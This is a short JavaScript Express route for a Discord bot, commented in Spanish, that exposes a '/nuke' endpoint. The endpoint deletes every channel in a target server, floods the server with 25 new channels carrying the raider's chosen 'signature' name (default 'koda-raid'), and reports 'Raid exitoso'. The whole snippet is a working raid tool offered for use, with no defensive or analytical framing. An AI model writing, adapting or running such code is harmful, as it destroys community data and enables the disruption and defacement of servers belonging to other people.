app.get('/nuke', async (req, res) => {
    const { guildId, name } = req.query; // Aquí recibe tu firma
    const guild = client.guilds.cache.get(guildId);
    
    if (!guild) return res.status(404).send("No estoy en ese server");

    try {
        const channels = await guild.channels.fetch();
        // Borrar canales existentes
        for (const channel of channels.values()) {
            await channel.delete().catch(() => {});
        }

        // Crear canales con tu FIRMA
        for (let i = 0; i < 25; i++) {
            setTimeout(() => {
                guild.channels.create({ 
                    name: name || 'koda-raid', // Usa tu firma del input
                    type: 0 
                }).catch(() => {});
            }, i * 400);
        }
        res.send("Raid exitoso");
    } catch (e) { res.status(500).send("Fallo"); }
});